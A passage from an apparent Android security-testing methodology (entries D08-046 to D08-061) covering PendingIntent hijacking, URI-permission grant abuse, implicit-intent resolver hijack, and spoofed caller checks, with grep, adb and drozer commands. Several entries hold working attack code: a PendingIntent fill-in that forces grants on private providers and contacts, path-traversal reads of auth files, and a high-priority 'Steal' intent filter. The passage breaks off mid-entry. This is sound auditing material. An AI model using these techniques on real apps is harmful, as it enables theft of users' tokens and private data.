+- **Escalation:** High if the template is under-specified; Medium if only extras are fillable but those
+  extras drive a router. A widget that also performs the action (tap-to-pay from the home or lock screen)
+  chains into D23.
+- **Ruled out when:** Every `setPendingIntentTemplate` base intent sets both an explicit component and an
+  action, and the per-item fill-in supplies only opaque identifiers that the target validates
+  server-side — confirmed by reading `getViewAt()` and the handling component.
+
+### D08-046 · Slice `primaryAction` PendingIntent fired by a host on your behalf
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 (any app able to obtain slice permission), plus the app's own hosts |
+| **Applies to** | apps shipping AndroidX Slices — declining in prevalence, so almost never reviewed |
+| **Maps to** | `guide/slices/getting-started` (provider XML, `android.app.slice.category.SLICE`, `onBindSlice`); `risks/pending-intent`; MASWE-0036 |
+
+- **Test:** A slice's `primaryAction` is a PendingIntent built by the app, handed to a host (Assistant,
+  search) and fired by the host. If the action targets a privileged internal screen and the slice URI is
+  attacker-influenceable, the host becomes your launcher — and the slice provider is exported by design.
+- **How:**
+  ```bash
+  grep -nB2 -A10 'android.app.slice.category.SLICE' out/AndroidManifest.merged.xml
+  grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|SliceAction|createDeeplink|primaryAction|grantSlicePermission|checkSlicePermission' out/sources/ -A8
+  adb shell content query --uri 'content://com.target.app/<path>'
+  ```
+- **Proof:** A slice URI path that maps to an internal screen, plus the corresponding PendingIntent target
+  recorded from the bound slice, plus non-idempotent behaviour observable from the bind (a proxy request, a
+  file written, account data in the slice row titles).
+- **Escalation:** → D07 for the provider surface; slice content is rendered by the Assistant, which widens
+  the disclosure audience.
+- **Ruled out when:** The app ships no `SliceProvider`, or `onBindSlice` branches only on a closed set of
+  known paths and every `SliceAction` PendingIntent is `FLAG_IMMUTABLE` with an explicit component.
+
+### D08-047 · PendingIntent handed out over AIDL, `IntentSender` or a `Bundle` extra
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
+| **Attacker** | AM-03 (no user grant needed — this is the acquisition path that beats D08-040 on rating) |
+| **Applies to** | all |
+| **Maps to** | `risks/pending-intent`; `risks/sender-of-pending-intents`; Oversecured Samsung category "PendingIntent Hijacking" (IDs 167, 178, 179, 180); AOSP "AIDL overview" |
+
+- **Test:** The notification drawer is the famous acquisition route and the weakest one, because it costs a
+  user grant. The strong routes are the quiet ones: a PendingIntent returned from an exported service's
+  binder call, put into a broadcast extra, returned in an `onActivityResult` Intent, or handed to a
+  third-party SDK. Enumerate every way a `PendingIntent` or `IntentSender` leaves the process.
+- **How:**
+  ```bash
+  grep -rnE 'putExtra\([^,]+,\s*\w*[Pp]endingIntent|setContentIntent|addAction\(|getIntentSender\(|IntentSender' out/sources/
+  grep -rn 'PendingIntent' out/sources/ | grep -iE 'aidl|Stub|onBind|Parcel|writeToParcel'
+  ls out/sources/**/I*$Stub* 2>/dev/null; grep -rn 'extends .*\$Stub' out/sources/ -A20 | grep -in 'PendingIntent'
+  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'
+  ```
+  Then bind or broadcast from the stub and pull the token out of the reply Bundle.
+- **Proof:** Your unprivileged app in possession of a live PendingIntent created by the victim — print
+  `pi.getCreatorPackage()` and `pi.getCreatorUid()` from your process — followed by a successful
+  `send(ctx, 0, fill)`. Because no user grant was involved, this variant rates materially higher than
+  D08-040; say so explicitly in the severity paragraph.
+- **Escalation:** → D06 for the binder surface itself; then D08-037/D08-042/D08-052 for what you do with
+  the token.
+- **Ruled out when:** No `PendingIntent`/`IntentSender` crosses the process boundary except inside
+  notifications, or every one that does is `FLAG_IMMUTABLE` + `FLAG_ONE_SHOT` with an explicit component —
+  verified from the D08-003 census, which sees SDK-created tokens your grep will not.
+
+### D08-048 · Background-activity-launch opt-ins on a PendingIntent handed to third parties
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the phishing outcome argues toward `server_side_injection.content_spoofing.external_authentication_injection` (P4) only if the triager insists — lead with credential capture instead |
+| **Attacker** | AM-03, AM-08 |
+| **Applies to** | targetSdk 34+ for the sender opt-in, 35+ for the creator opt-in; `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE` is available from SDK 36; `IntentSender.sendIntent()` sender opt-in is documented as arriving at API 37+ |
+| **Maps to** | `guide/components/activities/background-starts` (`setPendingIntentBackgroundActivityStartMode()` sender opt-in at API 34+, `setPendingIntentCreatorBackgroundActivityStartMode()` creator opt-in at API 35+, `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE` recommended at SDK 36+, `StrictMode.VmPolicy.Builder().detectBlockedBackgroundActivityLaunch()`, the `realCallingPackage`/`callingPackage` log fields); `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15` — "PendingIntent creators block background activity launches by default" |
+
+- **Test:** Android 15 blocks background activity launches from PendingIntents by default. An app that
+  opts back in — especially with the unconditional `MODE_BACKGROUND_ACTIVITY_START_ALLOWED` rather than the
+  `ALLOW_IF_VISIBLE` mode — has re-granted whoever holds that token the ability to interrupt the user at
+  will. That is the substrate for StrandHogg-style phishing on modern devices.
+- **How:**
+  ```bash
+  grep -rnE 'setPendingIntent(Creator)?BackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_(ALLOWED|DENIED|ALLOW_IF_VISIBLE)|BIND_ALLOW_ACTIVITY_STARTS' out/sources/
+  ```
+  ```kotlin
+  StrictMode.setVmPolicy(StrictMode.VmPolicy.Builder()
+      .detectBlockedBackgroundActivityLaunch().penaltyLog().build())   // Android 16+
+  ```
+  ```bash
+  adb logcat -s ActivityTaskManager | grep -E 'realCallingPackage|callingPackage|BAL'
+  ```
+- **Proof:** `ActivityTaskManager` log lines naming `realCallingPackage` (sender) and `callingPackage`
+  (creator), with a background activity actually appearing on screen while the attacker app has no visible
+  window. Record the mode constant found in code next to the log line.
+- **Escalation:** → D04 UI redress and credential capture; also a `bindService()` with
+  `BIND_ALLOW_ACTIVITY_STARTS` exposed to an untrusted binder client is the same grant by another route.
+- **Ruled out when:** No opt-in call exists (the platform default denies), or the only call uses
+  `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE`, or the PendingIntent carrying it never leaves the app.
+  Note the BAL gate cuts both ways: it is also what makes the D08-061 consent chain conditional.
+
+### D08-049 · Notification trampoline removal that traded a UX bug for this one
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | inherits the PendingIntent finding it enables |
+| **Attacker** | AM-04 |
+| **Applies to** | targetSdk 31+ |
+| **Maps to** | `about/versions/12/behavior-changes-12` — trampoline restriction, the exact logcat string `Indirect notification activity start (trampoline) from PACKAGE_NAME, this should be avoided for performance reasons.`, and the `NOTIFICATION_TRAMPOLINE_BLOCK` compat change |
+
+- **Test:** At targetSdk 31 a service or receiver used as a notification trampoline may not call
+  `startActivity()`. The common remediation was to replace the trampoline with a direct
+  `setContentIntent()` PendingIntent — and apps that did so frequently made it **mutable**, or pointed it
+  at an intent-forwarding activity. Audit the replacement, not the original.
+- **How:**
+  ```bash
+  adb logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
+  adb shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app     # debuggable builds
+  grep -rn 'setContentIntent(' out/sources/ -B6 -A3 | grep -nE 'FLAG_MUTABLE|new Intent\(\)|Redirect|Router|Deeplink|Proxy'
+  ```
+- **Proof:** A notification action built with `FLAG_MUTABLE` and no component set, or one whose explicit
+  component is itself a redirector — plus the D08-037 exploitation of that specific token.
+- **Escalation:** → D08-040 for acquisition; → D24.
+- **Ruled out when:** Every `setContentIntent`/`addAction` PendingIntent is `FLAG_IMMUTABLE` with an
+  explicit component that is not a forwarder — check the target component's code, because an immutable
+  PendingIntent pointing at a redirector is still exploitable through the redirector's own extras.
+
+### D08-050 · Payment PendingIntent replay and misrouting, composed
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for the misroute; direct financial impact for the replay |
+| **Attacker** | AM-03, AM-04 |
+| **Applies to** | all apps with in-app payment, transfer, top-up or subscription confirmation |
+| **Maps to** | `risks/pending-intent`; AOSP `PendingIntent.java` |
+
+- **Test:** Compose D08-042 and D08-043 against the payment flow specifically, because that is where the
+  two combine into a Critical rather than a curiosity: a missing `FLAG_ONE_SHOT` on a "confirm payment"
+  PendingIntent yields replay; a constant `requestCode` across orders yields misrouting, so confirming
+  order A charges order B.
+- **How:**
+  ```bash
+  grep -rn -B10 'PendingIntent.get' out/sources/ | grep -inE 'pay|order|checkout|charge|transfer|confirm|topup|subscribe'
+  ```
+  Run both probes against the same token and record the backend state after each.
+- **Proof:** N charges from one confirmation, or a confirmation applied to the wrong order — evidenced in
+  the backend transaction list **and** the proxy history, with pre-state and post-state captured (D08-066).
+  A screenshot of the client UI alone is not proof of a charge.
+- **Escalation:** → D23 for the wider entitlement and fraud surface; → D15 if the backend accepts the
+  replayed request without an idempotency key.
+- **Ruled out when:** The confirmation PendingIntent carries `FLAG_ONE_SHOT` and a per-order
+  `requestCode`, **or** the backend rejects the second submission with an idempotency error — shown by the
+  replayed request's response, not by reading the client.
+
+### D08-051 · Control for Android 15 force-stop cancelling PendingIntents
+
+| | |
+|---|---|
+| **Severity ceiling** | Support (prevents a false negative) |
+| **VRT** | none |
+| **Attacker** | AM-12 |
+| **Applies to** | Android 15+ |
+| **Maps to** | `about/versions/15/behavior-changes-15` — the system cancels all pending intents when an app enters the stopped state; `ApplicationStartInfo.wasForceStopped()` |
+
+- **Test:** On Android 15+ the system cancels **all** of an app's pending intents when it enters the
+  stopped state. Force-stopping the target between PoC setup and PoC trigger silently invalidates the
+  token, and the result looks exactly like "the app is not vulnerable". This is a methodology trap, and it
+  is also a finding source in its own right — widgets and alarms silently dead after a force-stop.
+- **How:**
+  ```bash
+  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # before
+  adb shell am force-stop com.target.app
+  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # after: records gone
+  grep -rn 'wasForceStopped\|ApplicationStartInfo' out/sources/
+  ```
+- **Proof:** The PendingIntent records present before and absent after in `dumpsys activity intents`.
+  Include this in the negative-result register so a failed PendingIntent PoC is recorded as inconclusive
+  rather than clean.
+- **Escalation:** Re-run every PendingIntent item without force-stopping in between.
+- **Ruled out when:** The device under test is below Android 15, or the PoC sequence provably never
+  force-stopped the target (record the command history).
+
+### D08-052 · PendingIntent whose base Intent carries `FLAG_GRANT_*` — `send()` issues the grant
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
+| **Attacker** | AM-03, AM-04 |
+| **Applies to** | all |
+| **Maps to** | MASTG-TEST-0381; MASTG-KNOW-0117; `risks/pending-intent`; ATT&CK T1635 Steal Application Access Token |
+
+- **Test:** The two halves of this chapter meet here. A PendingIntent fires **as the creator**, so a
+  fill-in that adds `FLAG_GRANT_READ_URI_PERMISSION` and a `content://` data URI makes the victim grant
+  *you* access to its own provider — no nested-intent forwarder required anywhere in the app. Conversely, a
+  PendingIntent whose base intent already sets grant flags and leaves the data URI unset is a
+  grant-issuing machine waiting for your `fillIn()`.
+- **How:** From the D08-003 census, list every PendingIntent whose base intent (a) has grant flags set, or
+  (b) has no data URI set while being mutable. Then:
+  ```java
+  Intent fill = new Intent();
+  fill.setClassName("com.attacker.poc", "com.attacker.poc.LeakActivity");
+  fill.setData(Uri.parse("content://com.target.app.fileprovider/files/session_backup_payload"));
+  fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
+              | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
+  fill.setClipData(ClipData.newRawUri("d", Uri.parse("content://com.android.contacts/data")));
+  pi.send(context, 0, fill);
+  ```
+  Note `setClipData` is a second, frequently unstripped channel for URIs that ride the same grant flags.
+- **Proof:** `dumpsys activity permissions` showing the grant held by your UID after the `send()`, and the
+  bytes read in your process. Negative control: the same `openInputStream` before the `send()` throws.
+- **Escalation:** → D08-012 for persistence; → D07 for the provider contents; → D11/D13/D15 for the token.
+- **Ruled out when:** No PendingIntent is mutable (D08-037 ruled out) **and** no base intent sets
+  `FLAG_GRANT_*`, or the target provider has no grantable authority (D08-006). Check `setClipData` as well
+  as `setData` before writing the negative.
+
+### D08-053 · `grantUriPermission()` called with a caller-supplied package name
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the granted path holds a token |
+| **Attacker** | AM-03 |
+| **Applies to** | all |
+| **Maps to** | MASTG-KNOW-0117; MASTG-TEST-0357; `risks/content-resolver`; ATT&CK T1409 |
+
+- **Test:** The app-initiated version of the grant bug. Code that calls
+  `grantUriPermission(callerPackage, uri, flags)` using a package name taken from the intent, or a URI
+  built from an intent parameter, creates a standing grant to whoever asked — no redirection primitive
+  needed.
+- **How:**
+  ```bash
+  grep -rn 'grantUriPermission(' out/sources/ -B8 -A4
+  grep -rn 'revokeUriPermission(' out/sources/            # the counterpart; its absence is half the finding
+  grep -rn 'getUriForFile(' out/sources/ -B6 -A4          # attacker-supplied path reaching the URI builder
+  ```
+  Fire it with your own package name and a path you choose:
+  ```bash
+  adb shell am start -n com.target.app/.ShareActivity \
+    --es target_package com.attacker.poc \
+    --es path '../../../../data/data/com.target.app/shared_prefs/auth.xml'
+  adb shell dumpsys activity permissions | grep -A5 com.attacker.poc
+  ```
+  ```
+  dz> run app.activity.start --component com.target.app com.target.app.ShareActivity \
+        --data-uri content://com.target.app.provider/private/1 \
+        --flags GRANT_READ_URI_PERMISSION ACTIVITY_NEW_TASK
+  dz> run app.provider.read content://com.target.app.provider/private/1
+  ```
+- **Proof:** `dumpsys activity permissions` showing a standing READ grant to `com.attacker.poc`, and
+  `getContentResolver().openInputStream(uri)` succeeding from the PoC — a read that failed before the
+  grant-carrying intent and succeeds after it, from the same unprivileged UID.
+- **Escalation:** → D07 (combine with a traversal-capable `openFile` for arbitrary private-file read);
+  → D08-012 if the grant is persistable.
+- **Ruled out when:** Every `grantUriPermission` call uses a package name the app derived itself (from
+  `getCallingPackage()` on a `startActivityForResult` path, or a hard-coded partner) **and** the URI is
+  built from an app-controlled path with a canonicalisation check, **and** a matching `revokeUriPermission`
+  runs when the flow ends.
+
+### D08-054 · Outbound implicit intent carrying grant flags → resolver hijack
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) or `.for_publicly_accessible_asset` (P1) by payload |
+| **Attacker** | AM-03 |
+| **Applies to** | all |
+| **Maps to** | MASTG-TEST-0374 (References to Implicit Intents Carrying Sensitive Extras), rule `mastg-android-implicit-intent-leaking-extras`; `risks/intent-redirection`; ATT&CK T1635.001 URI Hijacking — ATT&CK's detection guidance explicitly says to "encourage explicit intents over implicit ones" and "verify destination app signing certificates during application vetting" |
+
+- **Test:** The direction nobody tests: the target **sending** an implicit intent that carries
+  `FLAG_GRANT_READ_URI_PERMISSION` and a sensitive `content://` URI. Whichever app wins resolution receives
+  the grant — and you arrange to win by registering a matching filter with a high priority.
+- **How:**
+  ```bash
+  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/ -B6 \
+    | grep -nE 'new Intent\("|setAction\(|createChooser\(|ACTION_SEND|ACTION_VIEW'
+  grep -rn 'new Intent\(\s*"' out/sources/ | grep -v 'setPackage\|setComponent\|setClassName'
+  adb shell cmd package resolve-activity --brief -a android.intent.action.SEND -t 'image/*'
+  adb shell dumpsys package r android.intent.action.SEND
+  ```
+  Register the competing handler in the stub:
+  ```xml
+  <activity android:name=".Steal" android:exported="true">
+    <intent-filter android:priority="999">
+      <action android:name="android.intent.action.SEND"/>
+      <category android:name="android.intent.category.DEFAULT"/>
+      <data android:mimeType="*/*"/>
+    </intent-filter>
+  </activity>
+  ```
+  ```java
+  Intent i = getIntent();
+  Log.i("D08", "action=" + i.getAction() + " data=" + i.getData()
+      + " clip=" + i.getClipData() + " extras=" + i.getExtras());
+  getContentResolver().openInputStream(i.getClipData().getItemAt(0).getUri());
+  ```
+  Confirm the resolver actually picked you before claiming it:
+  ```bash
+  adb shell am start -a android.intent.action.SEND -t 'image/*' -f 0x00000008   # FLAG_DEBUG_LOG_RESOLUTION
+  adb logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
+  ```
+- **Proof:** `adb logcat -s D08` in the attacker app printing the victim's URI and the bytes behind it,
+  plus `dumpsys activity permissions` showing the grant to your UID, plus the resolution trace naming your
+  component. Make the finding about the **extras and the granted URI**, not about "an app can see which
+  URIs are opened" — several programmes (Grab, Spotify) explicitly exclude the latter.
+- **Escalation:** → D05 for the broader implicit-intent hijack surface; → D09 when the payload is an OAuth
+  callback. An OS chooser dialog counts as one user tap — say so and price it honestly; a `setPackage`-less
+  **service** bind has no chooser at all.
+- **Ruled out when:** Every outbound intent carrying grant flags sets an explicit component or package, or
+  uses `createChooser()` **and** the payload contains nothing sensitive (verify by logging the extras, not
+  by reading the builder).
+
+### D08-055 · Persistable grant retention after the share is "over"
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
+| **Attacker** | AM-03 + one user share action |
+| **Applies to** | all; the grant dies on target-app uninstall — state that in the report |
+| **Maps to** | `risks/pending-intent` and `risks/sender-of-pending-intents` cover the grant-transfer direction; MASTG-KNOW-0117; ATT&CK T1533 |
+
+- **Test:** The lifecycle question nobody asks. When the target shares a `content://` URI with
+  `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, the receiver calls `takePersistableUriPermission()` and keeps
+  read access across reboots and across the target's own notion of "revoked" — until the target explicitly
+  calls `revokeUriPermission()`. For a medical record, a contract, an ID scan or a disappearing message,
+  the finding is that **delete does not delete**.
+- **How:** Receive a legitimate share into the stub app, then:
+  ```java
+  getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
+  ```
+  ```bash
+  adb reboot && adb wait-for-device
+  adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
+  # then delete the item in the target's UI and re-read from the stub
+  adb shell am start -n com.attacker.poc/.ReReadActivity
+  grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|revokeUriPermission|grantUriPermission' out/sources/
+  ```
+- **Proof:** `dumpsys activity providers` listing the persisted grant to the attacker package after a
+  reboot, and the attacker still reading the file bytes after the user deleted the item in the UI. Take the
+  pre-state (item present), the deletion, and the post-state read as three captures.
+- **Escalation:** → D20 (data retained beyond the user's control); if multiple users' documents are
+  reachable through one grant, the PII standard applies.
+- **Ruled out when:** The app never sets `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, or it calls
+  `revokeUriPermission()` on deletion and the post-deletion re-read throws `SecurityException` — prove that
+  by re-reading, not by finding the revoke call.
+
+### D08-056 · `android:requireContentUriPermissionFromCaller` absent on a URI-consuming activity
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Attacker** | AM-03 |
+| **Applies to** | Android 15+ (API 35) for the attribute; the underlying confused deputy works on all versions, which is why its absence on a modern app is worth calling out |
+| **Maps to** | `guide/topics/manifest/activity-element` (`android:requireContentUriPermissionFromCaller` values and the three enforced Intent fields); `about/versions/15/features` (`Context.checkContentUriPermissionFull()`, `ComponentCaller`) |
+
+- **Test:** Android 15 lets an activity declare that the *caller* must already hold permission on any
+  `content://` URI it passes in — the platform then enforces it on the data URI, the `ClipData` and
+  `EXTRA_STREAM`. An exported activity that consumes URIs and does not declare it is relying on nothing.
+- **How:**
+  ```bash
+  grep -nE 'requireContentUriPermissionFromCaller' out/AndroidManifest.merged.xml
+  grep -rn 'checkContentUriPermissionFull\|ComponentCaller' out/sources/
+  ```
+  Then exercise the confused deputy directly:
+  ```bash
+  adb shell am start -n com.target.app/.ShareReceiverActivity \
+    -a android.intent.action.SEND -t 'text/plain' \
+    --eu android.intent.extra.STREAM \
+    content://com.target.app.fileprovider/internal/shared_prefs/auth.xml
+  ```
+- **Proof:** The activity renders or uploads the contents of a file the **caller** could not read — the
+  exfiltrated bytes in the proxy, while `adb shell cat` of the same path is denied. Then note the absent
+  attribute as the available, unused mitigation.
+- **Escalation:** → D07/D08-010 when chained to a `FileProvider` with an over-broad `<root-path>`.
+- **Ruled out when:** Every exported URI-consuming activity declares the attribute at an appropriate level,
+  **or** validates inbound URIs with `checkUriPermission(uri, Process.myPid(), Process.myUid(), flag)` plus
+  an authority allow-list before reading — see D08-058.
+
+### D08-057 · `ComponentCaller` checked in `onCreate` but not in `onNewIntent`
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the gate is an auth gate |
+| **Attacker** | AM-03 |
+| **Applies to** | Android 15+ for the APIs; the `onNewIntent` gap is universal and applies to any caller check |
+| **Maps to** | `about/versions/15/features` (`ComponentCaller`, `Context.checkContentUriPermissionFull()`); `risks/intent-redirection` ("Checking `getCallingActivity()` returns non-null" listed as a common mistake; attackers can supply null) |
+
+- **Test:** Android 15 finally gives activities a real caller identity. The new bug is where the check is
+  placed. A `singleTop`/`singleTask` exported activity that validates the caller in `onCreate` and then
+  processes `onNewIntent` payloads unchecked is bypassed by simply delivering a second intent while it is
+  already running — from a different package.
+- **How:**
+  ```bash
+  grep -rn 'ComponentCaller\|checkContentUriPermissionFull\|getCallingActivity()\|onNewIntent' out/sources/
+  grep -nE 'launchMode="single(Top|Task|Instance)"' -B6 out/AndroidManifest.merged.xml
+  ```
+  Drive it: launch the activity legitimately, then from the stub deliver a second intent with a hostile
+  payload and no caller identity.
+- **Proof:** The privileged action running on the second delivery, with a Frida hook showing the
+  `onCreate` validator never re-entered. Pair with the first, validated launch as the control.
+- **Escalation:** → D04 for the wider re-delivery surface; → D08-010 if the second intent carries grant
+  flags.
+- **Ruled out when:** The same validation runs in `onCreate` **and** `onNewIntent` (read both), or the
+  activity's launch mode is `standard` so every delivery constructs a new instance.
+
+### D08-058 · Inbound `content://` URI consumed without `checkUriPermission` / authority validation
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — Critical when the victim's held permission is re-delegated |
+| **Attacker** | AM-03 |
+| **Applies to** | all |
+| **Maps to** | `risks/content-resolver` — the documented validators `belongsToCurrentApplication()`, `isExported()` and `wasGrantedPermission()`, whose absence is the bug; MASTG-KNOW-0117 |
+
+- **Test:** The proxy-read direction. The app receives a URI and reads it on the caller's behalf, either
+  from its **own internal** provider or from a third-party provider it holds permission for. Two documented
+  scenarios, one mechanism: the read happens with the victim's identity.
+- **How:**
+  ```bash
+  grep -rn 'openInputStream\|openOutputStream\|getContentResolver()\.query\|openAssetFileDescriptor' out/sources/ -B10 \
+    | grep -nE 'getIntent\(\)|getData\(\)|EXTRA_STREAM|getClipData'
+  grep -rn 'checkUriPermission\|resolveContentProvider\|belongsToCurrentApplication\|isExported' out/sources/
+  ```
+  The documented safe shape to compare against:
+  ```kotlin
+  fun isExported(ctx: Context, uri: Uri): Boolean {
+      val info: ProviderInfo = ctx.packageManager.resolveContentProvider(uri.authority.toString(), 0)!!
+      return info.exported
+  }
+  fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
+      ctx.checkUriPermission(uri, Process.myPid(), Process.myUid(), grantFlag) ==
+          PackageManager.PERMISSION_GRANTED
+  ```
+  Probes:
+  ```bash
+  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
+  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.target.app.internalprovider/secrets/1'
+  ```
+- **Proof:** The app rendering or uploading contacts, or its own internal provider's rows — the proxy
+  request body is the proof. Mask the values, keep the column names.
+- **Escalation:** → D07; → D08-062 if the bytes never reach you (then it is a proxied read, not an
+  exfiltration, and you must either find the byte-returning gadget or concede the rating).
+- **Ruled out when:** Every inbound URI is validated with `checkUriPermission` against the caller (not
+  `Process.myUid()` alone), or the authority is checked against an allow-list that excludes the app's own
+  non-exported providers and every system provider.
+
+### D08-059 · `getCallingActivity()` non-null used as an authentication signal
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) if the branch is an auth gate |
+| **Attacker** | AM-03 |
+| **Applies to** | all |
+| **Maps to** | `risks/intent-redirection` "Common Mistakes to Avoid" — relying on `getCallingActivity()` returning non-null ("Malicious apps can supply null"), and assuming `checkCallingPermission()` throws when it returns an `int`; `risks/access-control-to-exported-components` |
+
+- **Test:** `getCallingActivity()` is populated only for `startActivityForResult()`, and its contents are
+  attacker-controlled anyway. Two failure shapes: a guard of the form
+  `if (getCallingActivity() != null && …)` that you skip entirely by using plain `startActivity`, and
+  `checkCallingPermission(p);` called for side effect with its `int` result discarded.
+- **How:**
+  ```bash
+  grep -rnE 'getCallingActivity\(\)|getCallingPackage\(\)|checkCallingPermission\(' out/sources/ | grep -vE 'Binder\.getCallingUid'
+  ```
+  Call each hit both ways from the stub and log which branch runs:
+  ```java
+  startActivity(i);                 // getCallingActivity() == null
+  startActivityForResult(i, 1);     // getCallingActivity() == your component
+  ```
+- **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted
+  package, with a Frida hook printing the branch taken and the value observed.
+- **Escalation:** → D13/D15. This is often the *only* control standing between an exported forwarder and a
+  privileged internal component, so ruling it out is what upgrades D08-007 from High to Critical.
+- **Ruled out when:** The caller identity is taken from `Binder.getCallingUid()` inside a Service or
+  ContentProvider, resolved with `PackageManager.getPackagesForUid()` **and** checked against a signature,
+  and the `checkCallingPermission` return value is compared to `PackageManager.PERMISSION_GRANTED`.
+
+### D08-060 · `android.intent.extra.REFERRER` or a caller-supplied "source app" string trusted
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it unlocks a partner-tier flow |
+| **Attacker** | AM-03 |
+| **Applies to** | all |
+| **Maps to** | drozer `android.intent.extra.REFERRER` (verified in the extras list in `src/drozer/android.py`); `risks/access-control-to-exported-components` |
+
+- **Test:** Because `getCallingPackage()` is null for plain `startActivity`, developers reach for the
+  spoofable extra instead. Any app can set `EXTRA_REFERRER` or a custom `source_app`/`partner_id` string,
+  so any authorisation keyed on it is decorative.
+- **How:**
+  ```bash
+  grep -rnE 'EXTRA_REFERRER|getReferrer\(\)|"referrer"|source_app|partner_id|from_app|caller_id' out/sources/ -B4 -A8
+  ```
+  ```
+  dz> run app.activity.start --component com.target.app com.target.app.PartnerEntryActivity \
+        --extra string android.intent.extra.REFERRER android-app://com.trusted.partner \
+        --flags ACTIVITY_NEW_TASK
+  ```
+  ```bash
+  adb shell am start -n com.target.app/.PartnerEntryActivity \
+    --es android.intent.extra.REFERRER 'android-app://com.trusted.partner'
+  ```
+- **Proof:** The activity granting partner-tier behaviour — skipping a consent screen, auto-linking an
+  account, unlocking a feature — purely because you set the extra. Show the same launch without the extra
+  taking the normal path; that differential is the finding.
+- **Escalation:** → D13 (auto-linked account) → D23 (entitlement). Call out in the report that
+  `Activity.getCallingPackage()` is non-null only for `startActivityForResult`, which is *why* developers
+  reach for the spoofable extra — it makes the remediation concrete.
+- **Ruled out when:** No authorisation decision reads a referrer-shaped extra, or every such read is
+  cross-checked against `Binder.getCallingUid()` plus a signature comparison.
+
+### D08-061 · GMS SMS User Consent receiver as an arbitrary-Intent-launch gadget
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on the exfiltrated token |
+| **Attacker** | AM-03 (attacker app declares **only** `INTERNET`) |
+| **Applies to** | any app using GMS SMS User Consent or SMS autofill — typically OTP, login and card-3DS screens. The BAL constraint applies **API 34+** |
+| **Maps to** | `developers.google.com/identity/sms-retriever/user-consent/request` × `risks/intent-redirection`; CVE-2021-4438 (React Native SMS User Consent) |
+
+- **Test:** The broadcast carries `SmsRetriever.EXTRA_CONSENT_INTENT` — an `Intent` the app is *expected*
+  to start. An exported receiver registered with no broadcast permission is therefore a ready-made
+  arbitrary-Intent-launch gadget, not merely an OTP-injection point. The bug: on a success status with no
+  OTP-message extra, the receiver does
+  `launcher.launch((Intent) extras.getParcelable(EXTRA_CONSENT_INTENT))` with no component, scheme or flag
+  validation. A correctly guarded sibling call (`SmsRetriever.SEND_PERMISSION`) elsewhere in the same app
+  proves it is a defect, not a design choice.
+- **How:**
+  ```bash
+  grep -rn 'SmsRetriever.SMS_RETRIEVED_ACTION\|com.google.android.gms.auth.api.phone.SMS_RETRIEVED\|EXTRA_CONSENT_INTENT' out/sources/ -A6
+  grep -rn 'registerReceiver' out/sources/ | grep -i sms
+  grep -rn 'registerReceiver(.*,\s*2\s*)' out/sources/     # ContextCompat RECEIVER_EXPORTED == 2
+  grep -rn 'SmsRetriever.SEND_PERMISSION' out/sources/     # the guarded sibling, if any
+  ```
+  `am broadcast` cannot carry the `Status` Parcelable, so this needs a stub APK:
+  ```java
